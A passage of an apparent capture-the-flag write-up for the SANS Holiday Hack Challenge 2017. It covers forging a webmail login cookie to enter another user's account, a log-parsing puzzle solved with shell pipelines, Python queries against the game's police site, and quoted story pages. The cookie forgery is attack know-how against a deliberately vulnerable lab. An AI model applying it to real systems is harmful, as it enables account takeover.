me)!</p>
<p><strong>&lt;/Errata&gt;</strong></p>
<p>Alright, now we have a valid cookie for Alabaster's account. Or any account
really. This is the third oops: there's no link between the <code>name</code> set in
the cookie, and the <code>plaintext</code> and <code>ciphertext</code> variables. So now
that we have found a valid ciphertext for our plaintext <code>a</code>, we can put
anything we want in the <code>name</code> variable, such as
<code>admin&#64;northpolechristmastown.com</code>, and we'll be logged into the given
account:</p>
<img alt="ewa_alabaster_account.png" class="align-center" src="/images/sans-christmas-challenge-2017/ewa_alabaster_account.png" />
<p>If we snoop around Alabaster's mailbox, we find this email:</p>
<blockquote>
<p><strong>From:</strong> <a class="reference external" href="mailto:holly.evergreen&#64;northpolechristmastown.com">holly.evergreen&#64;northpolechristmastown.com</a></p>
<p><strong>To:</strong> <a class="reference external" href="mailto:all&#64;northpolechristmastown.com">all&#64;northpolechristmastown.com</a></p>
<p><strong>Subject:</strong> Lost book page</p>
<p>Hey Santa,</p>
<p>Found this lying around. Figured you needed it.</p>
<p><a class="reference external" href="http://mail.northpolechristmastown.com/attachments/GreatBookPage4_893jt91md2.pdf">http://mail.northpolechristmastown.com/attachments/GreatBookPage4_893jt91md2.pdf</a></p>
<p>:)</p>
<p>-Holly</p>
</blockquote>
<p>We get a link to the <a class="reference external" href="/docs/sans-christmas-challenge-2017/GreatBookPage4_893jt91md2.pdf">fourth page of The Great Book</a>
(sha256: <code>6afe9f8c7dc8a392b6d853a05f1c1ce67b490633e3aa6c22faa3b1936f1ceed0</code>):</p>
<blockquote>
<p>The Rise of the Lollipop Guild</p>
<p>As tensions escalated immediately before The Great Schism, outright
fistfights erupted in the streets of the Emerald City as the most
radicalized Elves and Munchkins battled for turf. In those early days, the
small-scale skirmishes were disorganized and chaotic. But as hostilities
and violence continued to grow, organized groups of elite fighters emerged
on each side to take control of the militias. One particularly notherworthy
band of commandos named itself the &quot;Lollipop Guild&quot;.</p>
<p>Today, despite its sweet candy-themed name, the Guild's mission is by no
means sugar coated. The official, stated focus of this liliputian force is
to apply elite military tactics to defend Oz against all Elven aggression.
What's more, it's also believed (at least among the Elves) that the
Lollipop Guild engages in offensive operations against the North Pole, both
from a cyber and kinetic perspective. The Elves consider the Lollipop Guild
to be a terrorist organization. Indeed, the North Pole Elven Blue Team
toils year-round defending the computer and network infrastructure of the
North Pole from attack. Their biggest fear is that the Lollipop Guild will
somehow disrupt or destroy the North Pole's biggest production of the year
- Santa's Christmas Day present delivery operation. The North Pole Blue
Team is on extremely high alert throughout Christmas Eve, and exhaustive
period of analysis and active defense this team refers to as &quot;Blue
Christmas&quot;.</p>
<p>Although it has never been proven, the Elves allege that the Lollipop Guild
has infiltrated its operatives among the North Pole population, cleverly
disguising these nefarious interlopers as Elves. According to these rumors,
so-called Munchkin Moles mingle among even the Elven Elite. Because Elves
and Munchkins look identical, Elven leadership remains confounded about
whether Munchkin Moles actually exist. Yet, rumors persist.</p>
</blockquote>
</div>
</div>
<div class="section" id="fifth-page-of-the-great-book">
<h2><a class="toc-backref" href="#id39">Fifth page of <em>The Great Book</em></a></h2>
<p>The fifth page is located in North Pole and Beyond level. We must use the
giant falling snowball to collect it. But let's solve the Cranberry Pi
challenge first.</p>
<div class="section" id="north-pole-and-beyond-bumbles-bounce">
<h3><a class="toc-backref" href="#id40">North Pole and Beyond: Bumbles Bounce</a></h3>
<div class="section" id="id8">
<h4><a class="toc-backref" href="#id41">Cranberry Pi</a></h4>
<pre class="literal-block">
                           ._    _.
                           (_)  (_)                  &lt;&gt; \  / &lt;&gt;
                            .\::/.                   \_\/  \/_/
           .:.          _.=._\\//_.=._                  \\//
      ..   \o/   ..      '=' //\\ '='             _&lt;&gt;_\_\&lt;&gt;/_/_&lt;&gt;_
      :o|   |   |o:         '/::\'                 &lt;&gt; / /&lt;&gt;\ \ &lt;&gt;
       ~ '. ' .' ~         (_)  (_)      _    _       _ //\\ _
           &gt;O&lt;             '      '     /_/  \_\     / /\  /\ \
       _ .' . '. _                        \\//       &lt;&gt; /  \ &lt;&gt;
      :o|   |   |o:                   /\_\\&gt;&lt;//_/\
      ''   /o\   ''     '.|  |.'      \/ //&gt;&lt;\\ \/
           ':'        . ~~\  /~~ .       _//\\_
jgs                   _\_._\/_._/_      \_\  /_/
                       / ' /\ ' \                   \o/
       o              ' __/  \__ '              _o/.:|:.\o_
  o    :    o         ' .'|  |'.                  .\:|:/.
    '.\'/.'                 .                 -=&gt;&gt;::&gt;o&lt;::&lt;&lt;=-
    :-&gt;&#64;&lt;-:                 :                   _ '/:|:\' _
    .'/.\'.           '.___/*\___.'              o\':|:'/o
  o    :    o           \* \ / */                   /o\
       o                 &gt;--X--&lt;
                        /*_/ \_*\
                      .'   \*/   '.
                            :
                            '
Minty Candycane here, I need your help straight away.
We're having an argument about browser popularity stray.
Use the supplied log file from our server in the North Pole.
Identifying the least-popular browser is your noteworthy goal.
</pre>
<p>Alright, it seems we just have to analyze and find the least popular browser
in a log file:</p>
<div class="highlight"><pre><span></span><span class="gp">elf@7283fcc58ff6:~$</span> ls -lh
<span class="go">total 29M</span>
<span class="go">-rw-r--r-- 1 root root  24M Dec  4 17:11 access.log</span>
<span class="go">-rwxr-xr-x 1 root root 5.0M Dec 11 17:31 runtoanswer</span>
<span class="gp">elf@7283fcc58ff6:~$</span> head access.log
<span class="go">XX.YY.66.201 - - [19/Nov/2017:06:50:30 -0500] &quot;GET /robots.txt HTTP/1.1&quot; 301 185 &quot;-&quot; &quot;Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)&quot;</span>
<span class="go">XX.YY.66.201 - - [19/Nov/2017:06:50:30 -0500] &quot;GET /robots.txt HTTP/1.1&quot; 404 5 &quot;-&quot; &quot;Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)&quot;</span>
<span class="go">XX.YY.89.151 - - [19/Nov/2017:07:13:03 -0500] &quot;GET /img/common/apple-touch-icon-57x57.png HTTP/1.1&quot; 200 3677 &quot;-&quot; &quot;Slack-ImgProxy (+https://api.slack.com/robots)&quot;</span>
<span class="go">XX.YY.66.201 - - [19/Nov/2017:07:22:12 -0500] &quot;GET / HTTP/1.1&quot; 301 185 &quot;-&quot; &quot;Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)&quot;</span>
<span class="go">XX.YY.45.77 - - [19/Nov/2017:07:43:08 -0500] &quot;GET /img/common/apple-touch-icon-57x57.png HTTP/1.1&quot; 200 3677 &quot;-&quot; &quot;Slack-ImgProxy (+https://api.slack.com/robots)&quot;</span>
<span class="go">XX.YY.201.12 - - [19/Nov/2017:08:21:10 -0500] &quot;GET /manager/html HTTP/1.1&quot; 301 185 &quot;-&quot; &quot;Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; WOW64; Trident/6.0)&quot;</span>
<span class="go">XX.YY.218.124 - - [19/Nov/2017:08:22:09 -0500] &quot;GET /img/common/favicon-128.png HTTP/1.1&quot; 304 0 &quot;-&quot; &quot;Mozilla/5.0 (X11; Linux x86_64; rv:50.0) Gecko/20100101 Firefox/50.0&quot;</span>
<span class="go">XX.YY.68.152 - - [19/Nov/2017:08:43:27 -0500] &quot;GET /img/common/apple-touch-icon-57x57.png HTTP/1.1&quot; 200 3677 &quot;-&quot; &quot;Slack-ImgProxy (+https://api.slack.com/robots)&quot;</span>
<span class="go">XX.YY.236.170 - - [19/Nov/2017:08:48:39 -0500] &quot;GET /img/common/apple-touch-icon-57x57.png HTTP/1.1&quot; 200 3677 &quot;-&quot; &quot;slack/2.47.0.7352 (motorola Moto G (4); Android 7.0)&quot;</span>
<span class="go">XX.YY.11.135 - - [19/Nov/2017:08:56:32 -0500] &quot;GET / HTTP/1.1&quot; 304 0 &quot;-&quot; &quot;Mozilla/5.0 (X11; Linux x86_64; rv:57.0) Gecko/20100101 Firefox/57.0&quot;</span>
</pre></div>
<p>We can see that the last column holds the user-agent. We can also observe that
the user-agent is just after the fifth double-quote on the line. So, if we use
the <code>cut</code> command, with <code>&quot;</code> as a separator, we will get the
user-agent by asking for the sixth field:</p>
<div class="highlight"><pre><span></span><span class="gp">elf@7283fcc58ff6:~$</span> cut -d<span class="s1">&#39;&quot;&#39;</span> -f <span class="m">6</span> access.log
<span class="go">Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)</span>
<span class="go">Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)</span>
<span class="go">Slack-ImgProxy (+https://api.slack.com/robots)</span>
<span class="go">Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)</span>
<span class="go">Slack-ImgProxy (+https://api.slack.com/robots)</span>
<span class="go">Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; WOW64; Trident/6.0)</span>
<span class="go">Mozilla/5.0 (X11; Linux x86_64; rv:50.0) Gecko/20100101 Firefox/50.0</span>
<span class="go">Slack-ImgProxy (+https://api.slack.com/robots)</span>
<span class="go">slack/2.47.0.7352 (motorola Moto G (4); Android 7.0)</span>
<span class="go">Mozilla/5.0 (X11; Linux x86_64; rv:57.0) Gecko/20100101 Firefox/57.0</span>
<span class="go">[snip]</span>
</pre></div>
<p>Alright, now that we have only the user-agents, we can <code>sort</code> the
user-agents, and use <code>uniq</code> to  remove duplicates, and count the number
of unique user-agents:</p>
<div class="highlight"><pre><span></span><span class="gp">elf@7283fcc58ff6:~$</span> cut -d<span class="s1">&#39;&quot;&#39;</span> -f <span class="m">6</span> access.log  <span class="p">|</span> sort <span class="p">|</span> uniq -c
<span class="go">      2 (KHTML, like Gecko) Chrome/36.0.1944.0 Safari/537.36</span>
<span class="go">    143 -</span>
<span class="hll"><span class="go">      1 Dillo/3.0.5</span>
</span><span class="go">      3 GarlikCrawler/1.2 (http://garlik.com/, crawler@garlik.com)</span>
<span class="go">     34 Googlebot-Image/1.0</span>
<span class="go">      3 MobileSafari/604.1 CFNetwork/889.9 Darwin/17.2.0</span>
<span class="go">      4 Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)</span>
<span class="go">      8 Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)</span>
<span class="go">    345 Mozilla/4.0 (compatible;)</span>
<span class="go">      2 Mozilla/5.0</span>
<span class="go">[snip]</span>
</pre></div>
<p>Hmm, <code>Dillo/3.0.5</code> seems to be the least popular web-browser, with only
one entry. However, there may be other user-agents with only one hit in the
log file. Let's sort our counted output:</p>
<div class="highlight"><pre><span></span><span class="gp">elf@7283fcc58ff6:~$</span> cut -d<span class="s1">&#39;&quot;&#39;</span> -f <span class="m">6</span> access.log  <span class="p">|</span> sort <span class="p">|</span> uniq -c <span class="p">|</span> sort -gr
<span class="go">  27285 Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94 Safari/537.36</span>
<span class="go">   8501 Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94 Safari/537.36</span>
<span class="go">   6221 Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0</span>
<span class="go">   6183 Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94 Safari/537.36</span>
<span class="go">   3163 Mozilla/5.0 (Windows NT 10.0; Win64; x64; Trident/7.0; rv:11.0) like Gecko</span>
<span class="go">   2733 Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/62.0.3202.94 Chrome/62.0.3202.94 Safari/537.36</span>
<span class="go">   2427 Mozilla/5.0 (X11; Linux x86_64; rv:57.0) Gecko/20100101 Firefox/57.0</span>
<span class="go">   2099 Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.100 Safari/537.36</span>
<span class="go">   2006 Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94 Safari/537.36</span>
<span class="go">   2002 Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.100 Safari/537.36</span>
<span class="go">[snip]</span>
<span class="go">      2 (KHTML, like Gecko) Chrome/36.0.1944.0 Safari/537.36</span>
<span class="go">      1 slack/2.47.1.7358 (samsung SM-G955F; Android 7.0)</span>
<span class="go">      1 slack/2.47.1.7358 (samsung SM-G950U; Android 7.0)</span>
<span class="go">      1 slack/2.47.1.7358 (samsung SM-G935T; Android 7.0)</span>
<span class="go">      1 slack/2.47.1.7358 (samsung SM-G935L; Android 7.0)</span>
<span class="go">      1 slack/2.47.1.7358 (samsung SM-G930F; Android 7.0)</span>
<span class="go">      1 slack/2.47.1.7358 (samsung SM-G920P; Android 7.0)</span>
<span class="go">      1 slack/2.47.1.7358 (motorola XT1635-02; Android 7.1.1)</span>
<span class="go">      1 slack/2.47.1.7358 (motorola Moto G (5) Plus; Android 7.0)</span>
<span class="go">      1 slack/2.47.1.7358 (Xiaomi Redmi Note 4; Android 7.0)</span>
<span class="go">      1 slack/2.46.0.7100 (lenovo Lenovo K8 Note; Android 7.1.1)</span>
<span class="go">      1 slack/2.47.1.7358 (OnePlus ONEPLUS A3000; Android 7.1.1)</span>
<span class="go">      1 slack/2.47.1.7358 (OnePlus ONE A2003; Android 8.0.0)</span>
<span class="go">      1 slack/2.47.1.7358 (LYF LS-5504; Android 5.1.1)</span>
<span class="go">      1 slack/2.47.1.7358 (Intex Cloud Q11 4G; Android 6.0)</span>
<span class="go">      1 slack/2.47.1.7358 (Huawei Nexus 6P; Android 8.0.0)</span>
<span class="go">      1 slack/2.47.1.7358 (HUAWEI AGS-W09; Android 7.0)</span>
<span class="go">      1 slack/2.47.1.7358 (Google Pixel XL; Android 8.0.0)</span>
<span class="go">      1 slack/2.47.0.7352 (samsung SM-N950U; Android 7.1.1)</span>
<span class="go">      1 slack/2.47.0.7352 (samsung SAMSUNG-SM-N910A; Android 6.0.1)</span>
<span class="go">      1 slack/2.47.0.7352 (samsung SAMSUNG-SM-G870A; Android 6.0.1)</span>
<span class="go">      1 slack/2.47.0.7352 (motorola Moto G (4); Android 7.0)</span>
<span class="go">      1 slack/2.47.0.7352 (Sony F8331; Android 7.1.1)</span>
<span class="go">      1 slack/2.47.0.7352 (OnePlus ONEPLUS A3003; Android 7.1.1)</span>
<span class="go">      1 slack/2.47.0.7352 (OnePlus A0001; Android 7.1.2)</span>
<span class="go">      1 slack/2.47.0.7352 (LGE Nexus 5; Android 6.0.1)</span>
<span class="go">      1 slack/2.47.0.7352 (Google Pixel; Android 8.0.0)</span>
<span class="go">      1 slack/2.46.0.7100 (lenovo Lenovo K8 Note; Android 7.1.1)</span>
<span class="go">      1 slack/2.46.0.7100 (Wingtech 2014818; Android 7.1.2)</span>
<span class="go">      1 slack/2.46.0.7100 (OnePlus ONE E1003; Android 6.0.1)</span>
<span class="go">      1 slack/2.46.0.7100 (OnePlus ONE A2003; Android 6.0.1)</span>
<span class="go">      1 masscan/1.0 (https://github.com/robertdavidgraham/masscan)</span>
<span class="go">      1 masscan/1.0</span>
<span class="go">      1 curl/7.35.0</span>
<span class="go">      1 Slack/370354 CFNetwork/893.14 Darwin/17.3.0</span>
<span class="go">      1 Slack/370354 CFNetwork/893.10 Darwin/17.3.0</span>
<span class="go">      1 Slack/370342 CFNetwork/808.3 Darwin/16.3.0</span>
<span class="go">      1 Slack/370136 CFNetwork/811.5.4 Darwin/16.7.0</span>
<span class="go">      1 Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)</span>
<span class="go">      1 Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0; Touch; MASEJS)</span>
<span class="go">      1 Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0; MASMJS)</span>
<span class="go">      1 Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/6.0)</span>
<span class="go">      1 Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0</span>
<span class="go">      1 Mozilla/5.0 (X11; OpenBSD amd64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.106 Safari/537.36</span>
<span class="go">      1 Mozilla/5.0 (X11; Linux x86_64; rv:50.0) Gecko/20100101 Firefox/50.0</span>
<span class="go">      1 Mozilla/5.0 (Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko</span>
<span class="go">      1 Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.89 Safari/537.1</span>
<span class="go">      1 Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_1) AppleWebKit/604.3.5 (KHTML, like Gecko)</span>
<span class="go">      1 Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.90 Safari/537.36</span>
<span class="hll"><span class="go">      1 Dillo/3.0.5</span>
</span></pre></div>
<p>Well, even though some other user-agents have only one hit, they seem to be
different versions of the same browser. <code>Dillo/3.0.5</code> seems to be our
winner:</p>
<div class="highlight"><pre><span></span><span class="gp">elf@7283fcc58ff6:~$</span> ./runtoanswer
<span class="go">Starting up, please wait......</span>
<span class="hll"><span class="go">Enter the name of the least popular browser in the web log: Dillo/3.0.5</span>
</span><span class="go">That is the least common browser in the web log! Congratulations!</span>
</pre></div>
</div>
<div class="section" id="id9">
<h4><a class="toc-backref" href="#id42">Redirecting the snowball</a></h4>
<p>Now that we found the least popular browser, we get a new object: the Bumper,
which can redirect the snowball.</p>
<img alt="bumbles_bounce_terminal.png" class="align-center" src="/images/sans-christmas-challenge-2017/bumbles_bounce_terminal.png" />
<p>Now here's the layout I used to redirect the snowball. Incidently, I learned
that the Jam slows the snowball down, because it's sticky:</p>
<img alt="bumbles_bounce_snowball.gif" class="align-center" src="/images/sans-christmas-challenge-2017/bumbles_bounce_snowball.gif" />
<p>This level had the <a class="reference external" href="/docs/sans-christmas-challenge-2017/GreatBookPage5.pdf">fifth page to The Great Book</a> (sha256: <code>aed664454f956ed4f80c54540c4980ae28912c3ff816733a6fb84b366bd32c67</code>):</p>
<blockquote>
<p>The Abominable Snow Monster</p>
<p>When the Elves and reindeer refugees first arrived at the North Pole, they
found a barren but workable landscape. The desolate peace of the cold North
was a welcomed change from the bitter battles with the Munchkins back in
Oz. Dressed up like Eskimos for their first several months, all elves from
one to ninety-two worked without interruption building homes for
themselves, stalls for the reindeer, toy production lines, and finally a
splendid castle for Santa.</p>
<p>But then, it started. Some of their food stocks mysteriously disappeared.
Initially, the Elves hypothesized that Munchkins Moles were pilfering their
provisions, so they embarked on a detailed investigation. Sadly, the
taskforce found very little evidence, except for MASSIVE footprints in the
snow near the food storage bins.</p>
<p>And then, it got worse. Elves started disappearing. One at a time, over the
space of a couple of weeks, a half dozen elves simply vanished, their last
known location surrounded by more gigantic footprints.</p>
<p>The taskforce bravely followed the footprints back to an enormous cave,
where they found a gigantic furry beast with horrible fangs. The so-called
&quot;Abominable Snow Monster&quot; had enslaved the kidnapped elves, forcing them
to make gigantic snowballs he could throw as weapons. After mounting a
daring rescue operation, the Elves vowed to steer clear of the entire
region inhabited by the Abominable.</p>
<p>In later years, through the tireless efforts of social worker and arctic
prospector Yukon Cornelius, a miracle occurred! The Abominable actually
became a jolly, happy soul, who could laugh and play. The Elves welcomed
the newly friendly beast and started calling him &quot;Bumble&quot; as he earned a
job putting Christmas tree toppers into place without a stepladder.</p>
<p>Very recently, though, the Bumble's behaviour has become quite erratic.
Several times every day, his eyes seem to go blank as he stares off into
the distance. Rumor among the elves is that there must have been some
magic in something the Bumble ate. As of this writing, the Bumble is under
careful analysis by Yukon Cornelius and the North Pole's best
veterinarians. A diagnosis remains elusive.</p>
</blockquote>
<p>After solving this challenge, we have a little chat with Sam the Snowman:</p>
<blockquote>
<p><strong>Bumble:</strong> Arrrrrrrrgh! Grrrrrrrr! ROOOOOOOAR!</p>
<p><strong>Sam the Snowman:</strong> You've done it! You found out who was throwing the
giant snowballs! It was the Abominable Snow Monster. We should have known.
Thank you for your great work!</p>
<p>But, you know, he doesn't seem quite himself. Look into his eyes. It almost
looks like he has been hypnotized. Something's not right with him.</p>
<p>In fact, he seems to be under someone else's control. We've got to find out
who is pulling his strings, or else the real villain will remain on the
loose and will likely strike again.</p>
<p>It means, buckle your seatbelt, dear player, because the North Pole is
going bye-bye.</p>
</blockquote>
</div>
</div>
<div class="section" id="north-pole-christmas-town-infrastructure-north-pole-police-department-web-site">
<h3><a class="toc-backref" href="#id43">North Pole Christmas Town infrastructure: North Pole Police Department web site</a></h3>
<p>In the fourth page, we learned the existence of Munchkin moles, that try to
pass for Elves in order to spy on them. Let's try to learn more about these
Munchkin moles!</p>
<p>If we take a look back at the documents we found on the SMB server, there is
one called &quot;BOLO - Munchkin Mole Report.docx&quot;. This is the content:</p>
<blockquote>
<p>BOLO: Munchkin Mole Advisory</p>
<p>Please be advised that the long-rumored munchkin moles are now believed to
be real.  After a detailed and thorough investigation, North Pole
Authorities have identified two munchkins impersonating elves in Santa's
workshop.</p>
<p>When confronted, both munchkins were able to evade elf authorities after
throwing rocks and engaging in aggravated hair pulling. The pair
mysteriously disappeared after speaking an unknown word sounding like
&quot;puuurzgexgull.&quot;</p>
<p>Munchkin Descriptions</p>
<p><strong>Name</strong>: Boq Questrian</p>
<p><strong>Height</strong>: Approximately 4 feet</p>
<p><strong>Weight</strong>: Unknown</p>
<p><strong>Appearance</strong>: Reddish skin tone, blue eyes. A single curl of hair
dominates an otherwise unremarkable hairstyle.</p>
<p><strong>Warning</strong>: Boq is uncannily accurate at short-distance rock throwing.</p>
<p><strong>Name</strong>: Bini Aru</p>
<p><strong>Height</strong>: Approximately 4 feet</p>
<p><strong>Weight</strong>: Unknown</p>
<p><strong>Appearance</strong>: Pale skin, grey eyes. Unruly black hair.</p>
<p><strong>Warning</strong>: Bini is unrelenting in hair pulling.</p>
<p>If you see these munchkin moles, do not attempt to detain or apprehend
them. Contact the North Pole Police Department for assistance.</p>
<p>For more information visit <a class="reference external" href="https://nppd.northpolechristmastown.com">https://nppd.northpolechristmastown.com</a>.</p>
<p>Merry Christmas!</p>
</blockquote>
<p>So, two Munchkin moles were identified, Boq Questrian and Bini Aru. But there
may be more. Let's try and use the North Pole Police Department's website
to identify potential moles.</p>
<p>The <a class="reference external" href="https://nppd.northpolechristmastown.com">North Pole Police Department's website</a>
has a section infractions, where you can find what kind of infractions were
commited by children. The infractions go from <a class="reference external" href="https://nppd.northpolechristmastown.com/infractions?query=Playing+ball+in+house">playing ball in the house</a>
to <a class="reference external" href="https://nppd.northpolechristmastown.com/infractions?query=Trying+to+ruin+Christmas">trying to ruin Christmas</a>.</p>
<p>After too many infractions, children are put on the naughty list. But how many
infractions does it take?</p>
<p>On the SMB server, we also had a file called &quot;Naughty and Nice List.csv&quot;, which
gives us, line by line, the name of a child and whether their naughty or nice:</p>
<div class="highlight"><pre><span></span><span class="gp">$</span> head Naughty<span class="se">\ </span>and<span class="se">\ </span>Nice<span class="se">\ </span>List.csv
<span class="go">Abdullah Lindsey,Nice</span>
<span class="go">Abigail Chavez,Nice</span>
<span class="go">Aditya Perera,Naughty</span>
<span class="go">Adrian Kemp,Nice</span>
<span class="go">Adrian Lo,Nice</span>
<span class="go">Adriana Sutherland,Nice</span>
<span class="go">Agnes Adam,Nice</span>
<span class="go">Ahmed Hernandez,Nice</span>
<span class="go">Al Molina,Nice</span>
<span class="go">Alabaster Snowball,Nice</span>
</pre></div>
<p>Shame on you, Aditya Perera! Anyway, we can query the North Pole Police
Department website to query information on the children, and get results in
JSON for easy parsing. So, here's a quick Python script which queries the
NPPD website, and get the number of infractions for every child:</p>
<div class="highlight"><pre><span></span><span class="ch">#!/usr/bin/env python3</span>

<span class="kn">import</span> <span class="nn">sys</span>
<span class="kn">import</span> <span class="nn">requests</span>

<span class="k">def</span> <span class="nf">main</span><span class="p">(</span><span class="n">naughty_nice_file</span><span class="p">):</span>
    <span class="n">url</span> <span class="o">=</span> <span class="s1">&#39;https://nppd.northpolechristmastown.com/infractions?query={}&amp;json=1&#39;</span>
    <span class="n">max_infraction_nice</span> <span class="o">=</span> <span class="o">-</span><span class="mi">1</span>
    <span class="n">min_infraction_naughty</span> <span class="o">=</span> <span class="n">sys</span><span class="o">.</span><span class="n">maxsize</span>

    <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">naughty_nice_file</span><span class="p">,</span> <span class="s1">&#39;r&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
        <span class="c1"># We read every line...</span>
        <span class="k">for</span> <span class="n">line</span> <span class="ow">in</span> <span class="n">f</span><span class="o">.</span><span class="n">readlines</span><span class="p">():</span>
            <span class="c1"># ...and get the name of the child</span>
            <span class="n">name</span> <span class="o">=</span> <span class="n">line</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s1">&#39;,&#39;</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span>
            <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">name</span><span class="p">))</span>
            <span class="c1"># We retrieve the number of infraction for the child</span>
            <span class="n">number_of_infractions</span> <span class="o">=</span> <span class="n">r</span><span class="o">.</span><span class="n">json</span><span class="p">()[</span><span class="s1">&#39;count&#39;</span><span class="p">]</span>
            <span class="c1"># If the child is nice, we see if the number of infraction is</span>
            <span class="c1"># greater than the existing max</span>
            <span class="k">if</span> <span class="s1">&#39;Nice&#39;</span> <span class="ow">in</span> <span class="n">line</span><span class="p">:</span>
                <span class="k">if</span> <span class="n">number_of_infractions</span> <span class="o">&gt;</span> <span class="n">max_infraction_nice</span><span class="p">:</span>
                    <span class="n">max_infraction_nice</span> <span class="o">=</span> <span class="n">number_of_infractions</span>
            <span class="c1"># If the child is naughty, we see if the number of infraction is</span>
            <span class="c1"># smaller than the existing min</span>
            <span class="k">if</span> <span class="s1">&#39;Naughty&#39;</span> <span class="ow">in</span> <span class="n">line</span><span class="p">:</span>
                <span class="k">if</span> <span class="n">number_of_infractions</span> <span class="o">&lt;</span> <span class="n">min_infraction_naughty</span><span class="p">:</span>
                    <span class="n">min_infraction_naughty</span> <span class="o">=</span> <span class="n">number_of_infractions</span>

    <span class="k">print</span><span class="p">(</span><span class="s1">&#39;Maximum number of infractions for nice child: {}&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">max_infraction_nice</span><span class="p">))</span>
    <span class="k">print</span><span class="p">(</span><span class="s1">&#39;Minimum number of infractions for naughty child: {}&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">min_infraction_naughty</span><span class="p">))</span>

<span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s1">&#39;__main__&#39;</span><span class="p">:</span>
    <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">==</span> <span class="mi">2</span><span class="p">:</span>
        <span class="n">main</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">])</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="k">print</span><span class="p">(</span><span class="s1">&#39;usage: {} &lt;naughty_nice_file&gt;&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">]))</span>
</pre></div>
<p>Now, let's run the script:</p>
<div class="highlight"><pre><span></span><span class="gp">$</span> ./number_of_infractions.py <span class="s2">&quot;Naughty and Nice List.csv&quot;</span>
<span class="go">Maximum number of infractions for nice child: 3</span>
<span class="go">Minimum number of infractions for naughty child: 4</span>
</pre></div>
<p>We've found that every nice child has at most three infractions, and every
naughty child has at least four infractions. So it's safe to say that it takes
four infractions to be put on the naughty list.</p>
<p>Technically, we could have only queried the number of infractions for naughty
children, which wouls have given us four. Then we would only had to find a
nice child with three infractions, such as <a class="reference external" href="https://nppd.northpolechristmastown.com/infractions?query=al+molina">Al Molina</a>.
This supposes that <span class="formula"><i>max</i>_<i>infraction</i>_<i>nice</i> &lt; <i>min</i>_<i>infraction</i>_<i>naughty</i></span>,
but this seems to be a valid hypothesis.</p>
<p>Now, according to the report, the Munchkin moles were heavily into hair-pulling
and rock-throwing. Let's query the NPPD website for children that commited both
these infractions:</p>
<div class="highlight"><pre><span></span><span class="ch">#!/usr/bin/env python3</span>

<span class="kn">import</span> <span class="nn">requests</span>

<span class="k">def</span> <span class="nf">main</span><span class="p">():</span>
    <span class="n">hair_pulling_url</span> <span class="o">=</span> <span class="s1">&#39;https://nppd.northpolechristmastown.com/infractions?query=Aggravated+pulling+of+hair&amp;json=1&#39;</span>
    <span class="n">rock_throwing_url</span> <span class="o">=</span> <span class="s1">&#39;https://nppd.northpolechristmastown.com/infractions?query=Throwing+rocks+%28at+people%29&amp;json=1&#39;</span>

    <span class="c1"># We use sets to avoid duplicate names</span>
    <span class="n">hair_pullers</span> <span class="o">=</span> <span class="nb">set</span><span class="p">()</span>
